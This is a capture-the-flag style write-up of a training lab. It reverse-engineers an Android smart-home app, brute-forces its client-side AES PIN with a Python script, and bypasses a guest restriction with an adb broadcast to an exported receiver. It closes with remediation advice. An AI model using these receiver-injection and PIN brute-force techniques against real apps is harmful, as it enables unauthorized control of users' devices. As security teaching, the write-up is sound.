![iot_connect_cover](cover_iot_connect.png)
# Mobile Hacking Lab: IOT Connect
**Ref: [Mobile Hacking Lab: IOT Connect](https://www.mobilehackinglab.com/course/lab-iot-connect)**

*Objective:* The lab objective is to exploit a `Broadcast Receiver` vulnerability in the IOT Connect app to trigger the `master switch` and turn on all devices in a way that a guest user cannot do through the normal UI flow.

## Static Analysis
Use `JADX GUI` to reverse the source code, then inspect the code paths.

In `AndroidManifest.xml`, we can see several `receiver` components with `export=true`, which is suspicious.
![img.png](img.png)
![img_1.png](img_1.png)
However, for `ProfileInstallReceiver`, although it has `export=true`, it still requires a permission to send a broadcast. Test whether the `DUMP` permission is defined in the system.
![img_2.png](img_2.png)
The search result shows this permission is not defined, or the code is obfuscated and cannot be identified clearly, so skip it for now. Continue with `MasterReceiver`, which does not require any permission and is still reachable. Search for the `MasterReceiver` string in the source.
![img_3.png](img_3.png)
We can see the receiver handling path is in `MasterReceiver.onReceive`. From this code, this dynamic receiver does not require permission and does not verify the caller sending the broadcast. Another key point: this dynamic receiver is initialized from normal activities.
```java
CommunicationManager.INSTANCE.initialize(this);
```
Since `LoginActivity` is exported, an attacker can launch this activity first so the receiver becomes active.
```manifest
<activity
    android:name="com.mobilehackinglab.iotconnect.LoginActivity"
    android:exported="true">
    <intent-filter>
        <action android:name="android.intent.action.MAIN"/>
        <category android:name="android.intent.category.LAUNCHER"/>
    </intent-filter>
</activity>
```

Analyze the processing flow for action `MASTER_ON`.

In `CommunicationManager.initialize(...)`, the dynamic receiver checks action `MASTER_ON`, reads the key from the intent, then validates it via `Checker.check_key(key)`.
```java
public void onReceive(Context context2, Intent intent) {
    if (Intrinsics.areEqual(intent != null ? intent.getAction() : null, "MASTER_ON")) {
        int key = intent.getIntExtra("key", 0);
        if (context2 != null) {
            if (Checker.INSTANCE.check_key(key)) {
                CommunicationManager.INSTANCE.turnOnAllDevices(context2);
                Toast.makeText(context2, "All devices are turned on", 1).show();
            } else {
                Toast.makeText(context2, "Wrong PIN!!", 1).show();
            }
        }
    }
}

```
Inside `turnOnAllDevices()`:
```java
public final void turnOnAllDevices(Context context) {
    Log.d("TURN ON", "Turning all devices on");
    turnOnDevice(context, FansFragment.FAN_STATE_PREFERENCES, FansFragment.FAN_ONE_STATE_KEY, true);
    turnOnDevice(context, FansFragment.FAN_STATE_PREFERENCES, FansFragment.FAN_TWO_STATE_KEY, true);
    turnOnDevice(context, ACFragment.AC_PREFERENCES, ACFragment.AC_STATE_KEY, true);
    turnOnDevice(context, PlugFragment.PLUG_FRAGMENT_PREFERENCES, PlugFragment.PLUG_STATE_KEY, true);
    turnOnDevice(context, SpeakerFragment.SPEAKER_FRAGMENT_PREFERENCES, SpeakerFragment.SPEAKER_STATE_KEY, true);
    turnOnDevice(context, TVFragment.TV_FRAGMENT_PREFERENCES, TVFragment.TV_STATE_KEY, true);
    turnOnDevice(context, BulbsFragment.BULB_FRAGMENT_PREFERENCES, BulbsFragment.BULB_STATE_KEY, true);
}
```
From both code snippets, we can conclude that to trigger `turnOnAllDevices()`, we only need to send action `MASTER_ON` with the correct key, and there is no `guest` permission check in `onReceive()`.

Check the PIN handling function.

PIN verification is entirely implemented in client-side code.
```java
private static final String algorithm = "AES";
private static final String ds = "OSnaALIWUkpOziVAMycaZQ==";

public final boolean check_key(int key) {
    try {
        return Intrinsics.areEqual(decrypt(ds, key), "master_on");
    } catch (BadPaddingException e) {
        return false;
    }
}
```
The key is derived directly from the PIN by converting PIN bytes and copying into a 16-byte array.
```java
private final SecretKeySpec generateKey(int staticKey) {
    byte[] keyBytes = new byte[16];
    byte[] staticKeyBytes = String.valueOf(staticKey).getBytes(Charsets.UTF_8);
    System.arraycopy(staticKeyBytes, 0, keyBytes, 0, Math.min(staticKeyBytes.length, keyBytes.length));
    return new SecretKeySpec(keyBytes, algorithm);
}
```
The cipher is created with `AES/ECB/PKCS5Padding` and decrypts a hardcoded ciphertext directly.
```java
SecretKeySpec secretKey = generateKey(key);
Cipher cipher = Cipher.getInstance(algorithm + "/ECB/PKCS5Padding");
cipher.init(2, secretKey);
byte[] decryptedBytes = cipher.doFinal(Base64.getDecoder().decode(ds2));
return new String(decryptedBytes, Charsets.UTF_8);
```

From the source, we already have `alg`, `cipher`, the crypto scheme, key derivation from PIN, and expected plaintext `master_on`. With these, brute-force can be used to recover the correct PIN.
```python
#!/usr/bin/env python3
import base64
import subprocess

DS = "OSnaALIWUkpOziVAMycaZQ=="
TARGET = b"master_on"


def generate_key_hex(pin: int) -> str:
    key = bytearray(16)
    pin_bytes = str(pin).encode("utf-8")
    key[: min(len(pin_bytes), 16)] = pin_bytes[:16]
    return key.hex()


def check_pin(pin: int) -> bool:
    result = subprocess.run(
        [
            "openssl",
            "enc",
            "-d",
            "-aes-128-ecb",
            "-K",
            generate_key_hex(pin),
        ],
        input=base64.b64decode(DS),
        stdout=subprocess.PIPE,
        stderr=subprocess.DEVNULL,
        check=False,
    )
    return result.returncode == 0 and result.stdout == TARGET


for pin in range(1_000_000):
    if check_pin(pin):
        print(f"[+] PIN found: {pin}")
        break
else:
    print("[-] PIN not found")

```
Run the script and get the result.
```commandline
[+] PIN found: 345
```
So the valid PIN is `345`.

## Dynamic Analysis
First, install the APK on your Android device.
```commandline
adb install com.mobilehackinglab.iotconnect.apk
```
Open the app and test behavior. Register and log in normally.
<img alt="img_4.png" src="img_4.png" width="320"/>
After access, go to `Set up`.
<img alt="img_5.png" src="img_5.png" width="320"/>
Our task is to send a broadcast to turn on all devices, but why not just turn them on manually first? :) *(Try it)*
<img alt="img_6.png" src="img_6.png" width="320"/>
You get an error message like `Sorry, guest ...`, meaning we are not admin so we cannot enable them. Next, open `Master Switch`. The UI allows entering a PIN, and we already found PIN `345`, so try it.
<img alt="img_7.png" src="img_7.png" width="320"/>
We still get the same restriction error for guest accounts. Re-check the logic for this feature.
![img_8.png](img_8.png)
The relevant code is in `MasterSwitchActivity`.
```java
// onCreate(..)
 button.setOnClickListener(new View.OnClickListener() { // from class: com.mobilehackinglab.iotconnect.MasterSwitchActivity$$ExternalSyntheticLambda0
    @Override // android.view.View.OnClickListener
    public final void onClick(View view) {
        MasterSwitchActivity.onCreate$lambda$0(user, this, view);
    }
});
//
public static final void onCreate$lambda$0(User user, MasterSwitchActivity this$0, View it) {
        Intrinsics.checkNotNullParameter(user, "$user");
        Intrinsics.checkNotNullParameter(this$0, "this$0");
        if (user.isGuest() != 1) {
            EditText editText = this$0.pin_edt;
            if (editText == null) {
                Intrinsics.throwUninitializedPropertyAccessException("pin_edt");
                editText = null;
            }
            String pinText = StringsKt.trim((CharSequence) editText.getText().toString()).toString();
            if (pinText.length() > 0) {
                int pin = Integer.parseInt(pinText);
                Intent intent = new Intent("MASTER_ON");
                intent.putExtra("key", pin);
                LocalBroadcastManager.getInstance(this$0).sendBroadcast(intent);
                return;
            }
            Toast.makeText(this$0, "Please enter a PIN", 0).show();
            return;
        }
        Toast.makeText(this$0, "Sorry, the masterswitch can't be controlled by guests", 0).show();
    }
```
From this, we infer that the `Guest` restriction exists only at UI level via `user.isGuest() != 1`.
So from the exposed broadcast path (`export=true`), we can use `adb am` directly.

## PoC Exploit

- From static analysis, the recovered PIN is: 345
- Action is `MASTER_ON` and extra is `key`

Just send action `MASTER_ON` with `key=345`, and it goes directly into `onReceive()` and triggers `turnOnAllDevices(...)`.
```commandline
adb shell am broadcast -a MASTER_ON --ei key 345
```
Check the result notification.
![img_9.png](img_9.png)
Log in and verify the device states.
<img alt="img_10.png" src="img_10.png" width="320"/>
Devices that guest could not enable before are now all turned on. Exploit successful.

## Conclusion
1. Impact

   - This vulnerability allows an attacker to bypass guest restrictions and control the master switch, resulting in turning on all devices managed by the app.
   - This is an access-control flaw caused by trusting externally supplied broadcast data while applying authorization checks only in the UI.

2. Root cause
   - The root cause has two parts:
     - The broadcast path for action `MASTER_ON` is not protected by permission or caller validation.
     - PIN validation is fully client-side and can be reversed or brute-forced from the code.

3. Remediation recommendations
   - Do not export the receiver handling `MASTER_ON` if it is only for internal use.
   - If it must be exported, enforce signature-level permission or proper caller validation.
   - Do not use global `registerReceiver(...)` for sensitive control flows without permission constraints.
   - Do not keep PIN validation logic entirely on the client side.
   - Move user authorization checks out of UI and enforce them at the actual sensitive action handler.

*The IOT Connect app contains a Broadcast Receiver vulnerability that enables guest-restriction bypass. By analyzing source code, deriving PIN 345, and sending `MASTER_ON` broadcast directly to an unprotected processing path, an attacker can turn on all devices without following a valid non-guest UI flow.*
